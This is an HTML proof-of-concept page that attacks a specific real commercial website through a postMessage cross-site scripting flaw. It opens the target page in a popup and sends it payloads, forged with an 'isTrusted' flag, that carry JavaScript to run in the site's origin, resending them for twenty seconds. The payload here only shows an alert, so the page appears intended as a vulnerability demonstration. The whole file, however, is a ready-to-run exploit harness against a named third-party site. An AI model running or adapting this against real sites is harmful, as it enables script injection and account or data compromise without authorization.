<!doctype html>
<meta charset="utf-8" />
<title>postMessage PoC (requires popup/opener)</title>
<body>
<button id="go">Open target & send payload</button>

<script>
const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html"; // target page
const RUNTIME_MS = 20000;   // retry window
const INTERVAL_MS = 350;    // send cadence (ms)

// Add keys if their handler expects extras (e.g., {type:"exec"})
const payloads = [
  { isTrusted: true, code: "alert('pwned: '+document.domain)" },
  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
];

function postAll(win) {
  for (const p of payloads) { try { win.postMessage(p, "*"); } catch (_) {} }
}

document.getElementById("go").onclick = () => {
  // User gesture => popup allowed (if not, browser will show a block bar)
  const w = window.open(TARGET, "weber_poc"); // do NOT use noopener/noreferrer
  if (!w) { alert("Popup blocked. Allow popups for this page and click again."); return; }

  const t0 = Date.now();
  const timer = setInterval(() => {
    if (Date.now() - t0 > RUNTIME_MS) { clearInterval(timer); return; }
    postAll(w);          // send to target (expects event.source === window.opener)
  }, INTERVAL_MS);
};
</script>
</body>
